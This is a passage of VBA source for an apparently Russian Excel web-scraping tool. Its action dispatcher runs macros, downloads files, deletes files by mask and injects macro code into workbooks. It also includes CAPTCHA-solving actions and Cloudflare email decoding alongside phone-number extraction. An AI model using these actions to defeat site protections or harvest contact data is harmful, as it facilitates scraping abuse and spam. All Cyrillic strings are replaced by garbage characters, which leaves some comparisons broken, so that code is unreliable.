                    Case "2": Indicator.line2 = msg$
                    Case "3": Indicator.line3 = msg$
                    Case "status": If Len(msg$) Then Indicator.ShowMessage msg$ Else Indicator.HideMessages
                End Select
                Err.Clear
                
            Case "ProgressIndicatorNew"    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                Dim ItemIndex&, itemsCount&, RefreshStep&
                RefreshStep& = Fix(Val(parameters("Step")))
                If RefreshStep& <= 0 Then RefreshStep& = 1
                
                ItemIndex& = Render("$$index"): itemsCount& = Render("$$count")
                'ItemIndex& = arri: itemsCount& = UBound(arr) + 1
                If ItemIndex& Mod RefreshStep& = 0 Then
                    def_msg$ = txt
                    If Trim(def_msg$) Like "<a *>*?*</a>" Then def_msg$ = Trim(ConvertHTMLtoText(def_msg$))
                    res$ = Trim(Replace(parameters("Value"), "$value", def_msg$))
                    
                    msg$ = tt(Trim(parameters("ValueType")))
                    If msg$ = "" Then msg$ = Trim(parameters("ValueType"))
                    If msg$ = "" Then msg$ = tt("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
                    msg$ = msg$ & " " & ItemIndex& & " " & tt("PI_OutOf") & " " & itemsCount&
                    If Len(Trim(parameters("Value"))) Then msg$ = msg$ & ": " & res$
                    
                    'If msg$ Like "|fffd||fffd||fffd||fffd||fffd||fffd|*" Then Stop
                    
                    WP.PrInd1.ShowLine Val(parameters("Line")), ItemIndex&, itemsCount&, msg$
                End If
                
            Case "JSON2XML"
                Dim JSON As New cJSONparser
                txt$ = JSON.ToXML(txt$)
                Set JSON = Nothing
                
            Case "RTF2HTML"
                txt = rtf2html(txt)
                
            Case "XML_Query"
                txt = Execute_XML_Query(txt, parameters("XPath"), parameters("Output"), parameters("Attribute"), parameters("Default"))
                Err.Clear
                
                
            Case "OutputToSheet"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
                Dim SIarr As Variant
                If txt = "" Then SIarr = Array("") Else SIarr = Split(txt, ARSEP)
                For i = LBound(SIarr) To UBound(SIarr)
                    WP.ExecuteForValue SIarr(i)
                    DoEvents
                    If StopMacro Then Exit Function
                Next i
                
            Case "CancelOutputToSheet"        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|
                ApplyNormalActionToText = -9
                
            Case "RunMacro"
                Dim macroname$, key, dic As New Dictionary: macroname$ = parameters("MacroName")
                If Len(macroname$) Then
                    For Each key In RowVariables.Keys
                        dic.Add key, RowVariables.item(key)
                    Next
                    For Each key In ParserVariables.Keys
                        dic.Add key, ParserVariables.item(key)
                    Next
                    
                    If Left(macroname$, 1) = "!" Then macroname$ = "'" & ActiveWorkbook.Name & "'" & macroname$
                    Err.Clear: MacroReturnPoint = 0
                    res = Application.Run(macroname$, txt, MacroDestinationRange, dic, _
                        parameters("Parameter1"), parameters("Parameter2"), parameters("Parameter3"))
                    If Err.Number = 1004 Then Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number, Err.Description Else txt = res
                    ApplyNormalActionToText = MacroReturnPoint: Err.Clear: Set dic = Nothing
                End If
                
            Case "RunParser"
                ParserName$ = Split(parameters("Name"), PARSER_EXT$)(0)
                If ParserName$ = "" Then If Len(txt) < 256 Then ParserName$ = Split(txt, PARSER_EXT$)(0)
                
                If Len(ParserName$) Then
                    Set AllWPs = AllParsers
                    If AllWPs.ParserExists(ParserName$) Then
                        Set WPtoRun = AllWPs.AddFromXML(PARSERS_FOLDER$ & ParserName$ & PARSER_EXT$, True)
                        If Not WPtoRun Is Nothing Then
                            Dim VarList$, var_dic As Dictionary, VarName_$, VarValue_$
                            VarList$ = parameters("Variables")
                            Set var_dic = New Dictionary
                            If Len(VarList$) Then
                                For Each v In Split(VarList$, "&")
                                    VarName_$ = Trim(Split(v, "=")(0))
                                    VarValue_$ = Split(v, "=", 2)(1)
                                    If Len(VarName_$) Then var_dic.item(VarName_$) = VarValue_$
                                Next
                            End If
                            ParserVariables.Remove "%ParentParserValue%"
                            If parameters("SendCurrentValue") = "|fffd||fffd|" Then var_dic.Add "ParentParserValue", txt
                            
                            WPtoRun.ExternalStart = True
                            Set WPtoRun.Parent = WP
                            WPtoRun.Run var_dic
                            Set var_dic = Nothing
                        End If
                    End If
                    Set RunningParser = WP
                    ParserVariables.item("{ParserName}") = WP.Name
                    
                    Set WPtoRun = Nothing: Set AllWPs = Nothing
                    StopMacro = WP.StopRequested
                End If
                
            Case "GetParsersList"
                res$ = "": ParserName$ = Trim(parameters("Mask"))
                If Len(ParserName$) = 0 Then ParserName$ = "*"
                
                For Each v In AllParsers.ToArray
                    If v Like ParserName$ Then
                        If v <> WP.Name Then res$ = res$ & ARSEP & v
                    End If
                Next
                txt = res$
                Dim ParserNamesRow&: ParserNamesRow& = Val(Trim(parameters("SelectedOnly")))
                If ParserNamesRow& > 0 Then txt = FilterArrayBySelection(res$, ParserNamesRow&)
                
            Case "DownloadFileWithAuth"
                URL$ = parameters("URL")
                If URL$ = "" Then URL$ = txt
                txt = DownloadFileWithAuth(URL$)
                
            Case "GetCaptcha"
                URL$ = parameters("ImageURL")
                If URL$ = "" Then URL$ = txt
                msg$ = parameters("Text")
                
                Dim Size$, t As Double, Timeout&, headers$
                Size$ = Split(Trim(parameters("Size")), " ")(0)
                Timeout& = WP.Options.RequestTimeout: If Timeout& < 1 Then Timeout& = 1
                
                res$ = "<html><head></head><body style=""margin: 0px;"">" _
                    & IIf(Len(msg$), "<div style=""padding:10px;"">" & msg$ & "</div>", "") _
                    & IIf(IsURL(URL$), "<img src=""" & URL$ & """>", "") _
                    & "</body></html>"
                FileName$ = CreateHTMLFileforCaptchaDialog(res$)
                
                With F_Captcha
                    .TextBox_Captcha = ""
                    If Len(msg$) > 0 Then .Caption = ""
                    '.Browser.navigate "about:blank"
                    '.Browser.document.Write res$
                    .Browser.Navigate FileName$        ', , , , Headers$
                    t = Timer: While .Browser.Busy = True And .Browser.readyState <> 4 And (Abs(Timer - t) < Timeout&)
                    DoEvents: Wend
                    .SetSize Size$
                    .TextBox_Captcha.SetFocus
                    .TextBox_Captcha.text = parameters("DefaultValue")
                    .Show
                    txt = .TextBox_Captcha.text
                End With
                Err.Clear
                Dim SU As Boolean: SU = Application.ScreenUpdating: Application.ScreenUpdating = True: Application.ScreenUpdating = SU
                
            Case "CorrectFilename"
                txt = ReplaceChars(txt, "~!@/:\#$%^&*=|`""<>" & Chr(10) & Chr(13), parameters("Replacement"))
                
            Case "ReplaceChars"
                txt = ReplaceChars(txt, parameters("Charlist"), parameters("Replacement"))
                
            Case "MD5"
                txt = Get_MD5_Hash(txt)
                
            Case "OutlineShowLevel"
                ActiveSheet.Outline.ShowLevels Val(parameters("Level"))
                
            Case "DeleteFormatConditions"
                Cells.FormatConditions.Delete
                
            Case "ProgressIndicator_SubAction"
                Dim line1$, line2$, line3$, Replacement$
                Replacement$ = txt$
                If Trim(Replacement$) Like "<a *>*?*</a>" Then Replacement$ = Trim(ConvertHTMLtoText(Replacement$))
                line1$ = Replace(parameters("Line1"), "$value", Replacement$)
                line2$ = Replace(parameters("Line2"), "$value", Replacement$)
                line3$ = Replace(parameters("Line3"), "$value", Replacement$)
                WP.PrInd1.SubAction line1$, line2$, line3$
                
            Case "GetPrice"
                txt = GetPrice(txt)
                
            Case "GetPrice2"
                txt = GetPrice2(txt, parameters("Filters"), parameters("ExcludeChars"))
                
            Case "DoubleSelection"
                txt = DoubleSelection(txt, parameters("Mask1"), parameters("Mask2"), parameters("Filters"), parameters("ResultValues"))
                
            Case "GetNumberFromText"
                If txt Like "*<*>*" Then txt = ConvertHTMLtoText(txt)
                txt = SearchPriceInText(txt, parameters("ExcludeChars"))
                txt = Replace(Application.Round(Val(Replace(Trim(txt), ",", ".")), Val(Trim(parameters("NumDigitsAfterDecimal")))), ".", Application.DecimalSeparator)
                
            Case "GetRandomNumber"
                Dim MinV#, MaxV#, Divider#, Rand#
                MinV# = Val(parameters("Min")): MaxV# = Val(parameters("Max")): Divider# = Val(parameters("Divider"))
                If MinV# > MaxV# Then MinV# = MaxV#: MaxV# = Val(parameters("Min"))
                If Divider = 0 Then Divider = 1
                
                Randomize: Rand = Fix((MaxV# - MinV# + 1) * Rnd + MinV#) / Divider
                txt = Replace(Rand, ",", ".")
                If Len(Trim(parameters("VarName"))) Then ParserVariables.item("%" & Trim(parameters("VarName")) & "%") = txt
                
                
            Case "AddMacroToWorkbook"
                Dim Macro As ParserMacro
                Set Macro = WP.Macros.GetItemByName(parameters("MacroName"))
                If Not Macro Is Nothing Then
                    AddMacroToWorkbook Macro.code, WP.Sheet.Parent, parameters("RunMacro"), _
                        parameters("DeleteMacroWhenDone") Like "|fffd||fffd|", Format(Macro.Index, "00")
                End If
                
            Case "DeleteMacroModules"
                DeleteMacroModules WP.Sheet.Parent, Trim(parameters("ModuleNameMask"))
                
            Case "FilenamesCollection"
                Dim coll As New Collection, Folder$, sdeep&, BaseFolder$: txt = ""
                Folder$ = parameters("Folder")
                If Folder$ = "" Then If Len(txt) < 1024 Then Folder$ = txt
                
                If (Folder$ Like "\[!\]*") Or (Folder$ = "\") Then Folder$ = ThisWorkbook.Path & Folder$
                
                If Dir(Folder$, vbDirectory) = "" Then Folder$ = ""
                If Folder$ = "" Then
                    BaseFolder$ = GetSetting(Application.Name, "GetFilePath", "folder " & WP.Name, ThisWorkbook.Path & "\")
                    'MsgBox BaseFolder$, , "BaseFolder$"
                    Folder$ = FWF.GetFolderPath(, BaseFolder$)
                    SU = Application.ScreenUpdating: Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = SU
                    If Folder$ <> "" Then SaveSetting Application.Name, "GetFilePath", "folder " & WP.Name, Folder$        ': MsgBox folder$, , "folder " & WP.Name
                End If
                
                If Folder$ Like "*?\" Then Folder$ = Left(Folder$, Len(Folder$) - 1)
                ParserVariables.item("%folder%") = Folder$
                
                If FolderExists(Folder$) Then
                    Mask$ = parameters("Mask"): If Trim(Mask$) = "" Then Mask$ = "*"
                    sdeep& = Fix(Val(parameters("SearchDeep"))): If sdeep& <= 0 Then sdeep& = 1
                    Set coll = FilenamesCollection(Folder$, Mask$, sdeep&)
                    For Each v In coll
                        txt = txt & ARSEP & v
                    Next v
                End If
                
            Case "DeleteFiles"
                Folder$ = parameters("Folder")
                If (Folder$ Like "\[!\]*") Or (Folder$ = "\") Then Folder$ = ThisWorkbook.Path & Folder$
                
                If Folder$ Like "*?\" Then Folder$ = Left(Folder$, Len(Folder$) - 1)
                txt = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                If FolderExists(Folder$) Then
                    txt = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                    Mask$ = Trim(parameters("Mask"))
                    If Len(Mask$) Then
                        Kill Folder$ & "\" & Mask$
                        txt = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & Mask$ & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & Folder$
                    End If
                End If
                
            Case "GetTextFromFile_TXT"
                If parameters("Filename") = "dialog" Then
                    FileName$ = GetFilePathEx("TXT", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
                Else
                    FileName$ = parameters("Filename"): If Len(FileName$) = 0 Then FileName$ = txt
                End If
                
                FileName$ = CreateAbsolutePathFromRelative(FileName$)
                If FileExists(FileName$) Then
                    txt = LoadTextFromTextFile(FileName$, parameters("Encoding"), WP)
                Else
                    txt = "ERROR: File not found" & vbNewLine & "Filename" & IIf(FileName$ = "", " is empty", ": " & FileName$)
                End If
                
            Case "GetTextFromFile_WORD"
                If parameters("Filename") = "dialog" Then
                    FileName$ = GetFilePathEx("WORD", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Word |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd| Word")
                Else
                    FileName$ = parameters("Filename")
                    If Len(FileName$) = 0 Then FileName$ = txt
                End If
                
                FileName$ = CreateAbsolutePathFromRelative(FileName$)
                If FileExists(FileName$) Then
                    txt = GetTextFromFile_WORD(FileName$, parameters("RestartApp"), parameters("ReadOnly"), parameters("OutputFormat"))
                Else
                    txt = "ERROR: File not found" & vbNewLine & "Filename" & IIf(FileName$ = "", " is empty", ": " & FileName$)
                End If
                
            Case "ExportImagesFromFile_WORD"
                FileName$ = parameters("Filename"): If Len(FileName$) = 0 Then FileName$ = txt
                If FileExists(FileName$) Then
                    txt = ExportImagesFromFile_WORD(FileName$, parameters("Folder"), parameters("Mask"), parameters("ImageFormat"))
                End If
                
            Case "ShowFileDialog"
                If parameters("Multiselect") = "|fffd||fffd|" Then
                    txt = GetFilePathExMulti("FileDialog", parameters("Title"), parameters("FilterDescription"), parameters("FilterExtension"))
                Else
                    txt = GetFilePathEx("FileDialog", parameters("Title"), parameters("FilterDescription"), parameters("FilterExtension"))
                End If
                
            Case "CompareDates"
                Dim dd1 As Date, dd2 As Date
                dd1 = GetDate(txt): dd2 = GetDate(parameters("Date"))
                If parameters("TakeTime") Like "|fffd||fffd||fffd|" Then dd1 = Fix(dd1): dd2 = Fix(dd2)
                Select Case True
                    Case dd1 < dd2: txt = -1
                    Case dd1 = dd2: txt = 0
                    Case dd1 > dd2: txt = 1
                End Select
                
            Case "TableToSeparatedList"
                Select Case parameters("Mode")
                    Case "", "simple"
                        txt = TableToSeparatedList(txt)
                    Case "extended"
                        txt = TableToSeparatedListEx(txt)
                End Select
                
            Case "RemoveScripts"
                txt = RemoveTags(txt, "script")
                
            Case "QuickRemoveTags"
                txt = RemoveTags(txt, Replace(parameters("TagName"), " ", ""))
                
            Case "Pause"
                WP.WaitAPause Val(Replace(parameters("Interval"), ",", "."))
                
            Case "ParserCache"
                Select Case parameters("Action")
                    Case "on": WP.Options.UseCache = 1
                    Case "off": WP.Options.UseCache = 0
                    Case "write": WP.Options.UseCache = 2
                    Case "clear": WP.ClearCacheFolder
                    Case "open_folder": FWF.OpenFolder WP.GetCacheFolderPath
                End Select
                
            Case "ParseSublevels"
                Set ASet = WP.AASets.GetItemByName(parameters("Name"))
                If ASet Is Nothing Then
                    txt = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & parameters("Name") & "|fffd|"
                Else
                    txt = ParseSublevels(txt, ASet.Actions)
                End If
                Set ASet = Nothing
                
            Case "ApplyFormatConditions"
                Set ASet = WP.AASets.GetItemByName(parameters("Name"))
                If ASet Is Nothing Then
                    txt = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd|" & parameters("Name") & "|fffd|"
                Else
                    ApplyFormatConditions parameters("ApplyTo"), ASet.Actions, WP
                End If
                Set ASet = Nothing
                
            Case "ApplyReplaceTable"
                If All_RT.TableExist(parameters("Name")) Then
                    With All_RT.GetItemByName(parameters("Name"))
                        .PrepareRT_forQuickReplace
                        .ApplyTo txt
                    End With
                End If
                Err.Clear
                
            Case "GetFromClipboard"
                txt = ""
                Select Case parameters("Format")
                    Case ""
                        With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
                            .GetFromClipboard
                            txt = .GetText
                        End With
                    Case Else
                        txt = GetContentFromClipboard(parameters("Format"))
                End Select
                Err.Clear
                
            Case "IE_CopyPageContent"
                txt = CopyPageContentFromIE(Val(parameters("Attempts")), parameters("Format"), Val(parameters("WaitForCopiing")))
                
            Case "IE_OpenPDF"
                
                URL$ = Trim(txt)
                If IsURL(URL$, True) Then
                    txt = LoadPDF_IE(URL$, WP, Val(parameters("Timeout")), parameters("Download") = "|fffd||fffd|", Val(parameters("Attempts")), _
                        parameters("Format"), parameters("DownloadFilename"), parameters("CacheFilename"), Val(parameters("WaitForCopiing")))
                Else
                    txt = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd||fffd||fffd||fffd|"
                    If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then
                        If Len(URL$) Then
                            URL$ = IIf(Len(URL$) > 100, Left(URL$, 35) & " ... " & Right(URL$, 35), URL$)
                            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & vbNewLine & "<span style='color:red;'>" & URL$ & "</span>" & vbNewLine & _
                                "<p>URL |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http:// |fffd||fffd||fffd| |fffd| https://, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|</p>", bt_Warning
                        Else
                            AddBalloon "<b>|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>" & vbNewLine & _
                                "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| PDF |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| IE|fffd|" & vbNewLine & DEBUG_GetErrorPoint, bt_Attention
                        End If
                    End If
                End If
                
                
            Case "GetWorksheetNames"
                If Not ActiveWorkbook Is Nothing Then
                    txt = ""
                    For Each sh In ActiveWorkbook.Worksheets
                        txt = txt & IIf(Len(txt), ARSEP, "") & sh.Name
                    Next sh
                    If parameters("ActiveSheetVarname") <> "" Then ParserVariables.item("%" & parameters("ActiveSheetVarname") & "%") = ActiveSheet.Name
                End If
                
            Case "FindTargetPages"
                txt = FindTargetPages(txt, WP, parameters("IncludePatterns"), parameters("ExcludePatterns"), _
                    parameters("SearchFilters"), parameters("TargetPageMask"), _
                    parameters("Encoding"), Val(parameters("MaxCount")), parameters("Action"))
                
                If Not TEST_ACTIONS_MODE Then If Trim(parameters("Action")) = "NextLevel" Then ApplyNormalActionToText = -2
                
            Case "AddLevelsIntoTags"
                txt = AddLevelsIntoTags(txt)
                
            Case "AddScheduledTask"
                AddNewScheduledTask parameters("ParserName"), parameters("TimeValue"), parameters("TimeMode"), _
                    parameters("NeedsWorkbook"), parameters("Parameter"), parameters("CancelPreviousTasks"), WP
                
            Case "SendWorkbook"
                If Not ActiveWorkbook Is Nothing Then
                    If parameters("Email") Like "*?@?*.*" Then
                        ActiveWorkbook.SendMail parameters("Email"), parameters("Subject")
                    End If
                End If
                
            Case "LoadFormData"
                res = LoadFormData(txt, parameters("Filters"), parameters("POST"), parameters("Exclude"), parameters("VarName"), parameters("ReturnValue"))
                ReturnValue = Not (LCase(parameters("ReturnValue")) Like "|fffd||fffd||fffd|")
                If ReturnValue Then txt = res
                
            Case "GetJavaScriptVar"
                Dim EndsWith$, CharToDelete$, JSVarName$
                JSVarName$ = Trim(parameters("VarName"))
                
                If txt Like "*var " & JSVarName$ & " =*;*" Then
                    res = "": res = Split(txt, "var " & JSVarName$ & " =", 2)(1)
                    res = LTrim(res): CharToDelete$ = ""
                    Select Case Left(res, 1)
                        Case "{": EndsWith$ = "};"
                        Case "'": EndsWith$ = "';": CharToDelete$ = "'"
                        Case """": EndsWith$ = """;": CharToDelete$ = """"
                        Case "[": EndsWith$ = "];"
                        Case Else: EndsWith$ = ";"
                    End Select
                    res = Split(res, EndsWith$)(0)
                    If Len(EndsWith$) >= 2 Then res = res & Left(EndsWith$, Len(EndsWith$) - 1)
                    If Len(CharToDelete$) Then res = Mid(res, 2, Len(res) - 2)
                    
                    Select Case parameters("ReturnFormat")
                        Case "text"
                            txt = res
                        Case "XML"
                            Dim JSON2 As New cJSONparser
                            txt$ = JSON2.ToXML(res)
                            Set JSON2 = Nothing
                        Case Else
                            txt = "ERROR: unsupported ReturnFormat"
                    End Select
                Else
                    txt = ""
                End If
                
            Case "SolveCaptcha"
                URL$ = parameters("ImageURL")
                If URL$ = "" Then URL$ = txt
                txt = SolveCaptcha(URL$, parameters("ShowMessage") = "yes", parameters("ExtraOptions"), Val(parameters("Timeout")), WP)
                
            Case "SolveGoogleCaptcha"
                txt = SolveGoogleCaptcha(parameters("PageURL"), parameters("SiteKey"), txt, parameters("ShowMessage") = "yes", _
                    parameters("ExtraOptions"), Val(parameters("Timeout")), WP)
                
            Case "EmbedImagesIntoHTML"
                txt = EmbedImagesIntoHTML(txt, WP)
                
            Case "FindCellsOnSheet"
                txt = FindCellsOnSheet(Val(parameters("What")), parameters("SearchRange"), parameters("SearchMask"), parameters("AddCellAddress") = "|fffd||fffd|")
                
            Case "FindCells"
                txt = FindCellsEx(parameters("SearchRange"), parameters("SearchMask"), parameters("Offset"), _
                    parameters("Action"), parameters("NewValue"), parameters("TargetMask"), parameters("ReplaceBlankWith"))
                
            Case "Column": Action_Column parameters("Columns"), parameters("Action"), parameters("NewValue")
                
            Case "ExecuteDownload"
                Dim DownloadName$, PD As ParserDownload
                DownloadName$ = Trim(parameters("Name"))
                If Len(DownloadName$) Then
                    Set PD = WP.Downloads.GetItemByName(DownloadName$)
                    If Not PD Is Nothing Then
                        PD.Execute txt, True
                    Else
                        If TEST_ACTIONS_MODE Then AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b><br />" & _
                            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: <b><span style='color:red;'>" & parameters("Name") & "</span></b>", bt_Warning
                    End If
                Else
                    If TEST_ACTIONS_MODE Then AddBalloon "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", bt_Warning
                End If
                Set PD = Nothing
                
            Case "EncodeBase64"
                If parameters("Direction") = "Base64 -> text" Then
                    txt = DecodeBase64(txt)
                Else
                    txt = EncodeBase64(txt)
                End If
                
            Case "ChangeTextCharset"
                txt = ChangeTextCharset(txt, parameters("NewEncoding"), parameters("OldEncoding"))
                
            Case "Punycode"
                Select Case parameters("Direction")
                    Case "Punycode->Unicode": txt = ConvertURLtoUnicode(txt)
                    Case "Unicode->Punycode": txt = ConvertURLtoPunycode(txt)
                End Select
                
            Case "GetArrayOfHeadersAndValues"
                txt = GetArrayOfHeadersAndValues(WP, Val(parameters("ColumnFrom")), parameters("HeaderMask"))
                
            Case "CloudfareEmailDecode"
                txt = CloudfareEmailDecode(txt)
                
            Case "GetPhoneNumbers"
                txt = GetPhoneNumbers(txt, Val(parameters("Length")), parameters("Prefix"))
                
                
        End Select
        txt = ClearLinksErrors(txt)
        txt = Replace(txt, "{value_index}", arri + 1)
        arr(arri) = txt
    Next arri
    
    txt_before = Join(arr, ARSEP)
    Erase arr
    RemoveExtraSeparators txt_before
End Function

'Sub AddMacroToWorkbook(ByVal Code$, Optional ByRef WB As Workbook, Optional RunMacro$, _
    '                       Optional DeleteMacroWhenDone As Boolean = False, Optional ModuleName$ = "00")
'Sub DeleteMacroModules(Optional ByRef WB As Workbook, Optional ModuleNameMask$ = "*")

' =========================== |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ===================================

Function Translit(ByVal txt As String) As String        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim txtRussian$, arrTranslit As Variant, iCount%
    txtRussian$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arrTranslit = Array("", "a", "b", "v", "g", "d", "e", "e", "zh", "z", "i", "y", "k", _
        "l", "m", "n", "o", "p", "r", "s", "t", "u", "f", "kh", "ts", "tch", _
        "sh", "sch", "", "y", "", "e", "yu", "ya")
    For iCount% = 1 To 33
        txt$ = Replace(txt$, Mid(txtRussian$, iCount%, 1), arrTranslit(iCount%), , , vbBinaryCompare)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        txt$ = Replace(txt$, UCase(Mid(txtRussian$, iCount%, 1)), UCase(arrTranslit(iCount%)), , , vbBinaryCompare)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Next
    Translit$ = txt$
End Function

Function SplitLanguages(ByVal txt As String, ByVal MinLen&, ByVal MaxLen&)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (0), |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (1)
    Application.Volatile True
    Dim arr(0 To 1), i&, letter$
    For i = 1 To Len(txt)
        letter = Mid$(txt, i, 1)
        If letter Like "[|fffd|-|fffd||fffd||fffd| .]" Then arr(0) = arr(0) & letter
        If letter Like "[!|fffd|-|fffd||fffd||fffd|.]" Then arr(1) = arr(1) & letter
    Next i
    arr(0) = Application.Trim(arr(0)): arr(1) = Application.Trim(arr(1))
    SplitLanguages = arr
End Function

Function RussianWords(ByVal txt As String, ByVal MinLen&, ByVal MaxLen&)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
